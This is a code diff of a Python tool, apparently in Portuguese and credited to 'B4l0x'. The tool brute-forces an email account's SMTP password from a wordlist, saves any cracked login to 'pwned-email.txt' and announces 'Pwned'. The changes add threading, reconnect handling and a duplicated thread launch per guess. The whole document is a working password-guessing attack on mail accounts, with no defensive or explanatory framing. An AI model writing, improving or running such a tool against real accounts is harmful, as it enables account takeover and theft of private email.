@@ -30,6 +30,7 @@ user = x.email
 porta = x.porta
 server = x.host
 tempo = time.strftime("%H:%M:%S")
+alocthread = thread.allocate_lock()
 
 def backspace(n):
     sys.stdout.write((b'\x08' * n).decode()) # use \x08 char to go back
@@ -44,7 +45,7 @@ def brute(i):
   try:
     smptserver.login(user, ii)
     print("\n\n\t[{} INFO] Pwned: {}:{}\n".format(tempo, user, ii))
-    arq = open("pwned-email.txt", "a")
+    arq = open("pwned-email.txt", "w")
     arq.write("Email: {} Senha: {}".format(user, ii))
     arq.close()
   except smtplib.SMTPAuthenticationError:
@@ -54,8 +55,9 @@ def brute(i):
     sys.stdout.flush()
     backspace(len(string))
     alocthread.release()
-    
-alocthread = thread.allocate_lock()
+  except smtplib.SMTPConnectError:
+    print("\n[{} INFO] Problema com a conecxão ao host, Reconectando...".format(tempo))
+    time.sleep(5)
 
 def iniciar():
   try:
@@ -66,6 +68,7 @@ def iniciar():
       exit()
     for i in wordlist:
       time.sleep(0.4)
+      thread.start_new_thread(brute, (i,))
       thread.start_new_thread(brute, (i,))
     print("\n\n\t[{} INFO] Fim do teste, obrigado por usar by B4l0x...\n").format(tempo)
     thread.exit()
